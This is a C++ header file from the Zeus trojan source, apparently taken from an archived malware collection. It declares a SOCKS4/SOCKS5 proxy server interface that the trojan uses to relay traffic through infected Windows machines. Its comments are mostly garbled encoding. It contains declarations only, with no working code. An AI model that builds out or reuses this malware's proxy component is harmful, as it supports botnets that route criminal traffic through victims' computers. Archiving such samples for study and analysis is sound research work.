/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  Socks5 IPv4/IPv6 ������ ��� ��������� ��������������.

  ����������: ��� ������� BIND �������� ���������� ��������� SOCKS5_BIND_TIMEOUT �����������.
*/
#pragma once

namespace Socks5Server
{
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);
  
  /*
    ������ ������ Socks 4 (������ �������� �� ������ �� ������).
    
    IN s       - �����, ����� ��������� ������� ����� �� ����� ������.
    IN timeout - ������� ������ � �������������, 0 ��� �������������� ��������.

    Return     - true - � ������ ���������� ������ ��� ������ ��������� � ������� �����,
                 false - � ������ ������������� ������ � ��������� ��� ������� �����.
  */
  bool _start5(SOCKET s, DWORD timeout);

  /*
    ������ ������ Socks 5 (������ �������� �� ������ �� ������).
    
    IN s       - �����, ����� ��������� ������� ����� �� ����� ������.
    IN timeout - ������� ������ � �������������, 0 ��� �������������� ��������.

    Return     - true - � ������ ���������� ������ ��� ������ ��������� � ������� �����,
                 false - � ������ ������������� ������ � ��������� ��� ������� �����.
  */
  bool _start4(SOCKET s, DWORD timeout);

  /*    Starting the session, with auto determine a Socks.
    
    IN s - the socket after the session socket will be closed.
    IN timeout - timeout of the socket, in milliseconds, 0 for unlimited expectations.

    Return - true - in the case of an error-free session protocol, and disconnected,
                 false - if there are errors in the protocol or connection failure.
  */
  bool _start(SOCKET s, DWORD timeout);
};
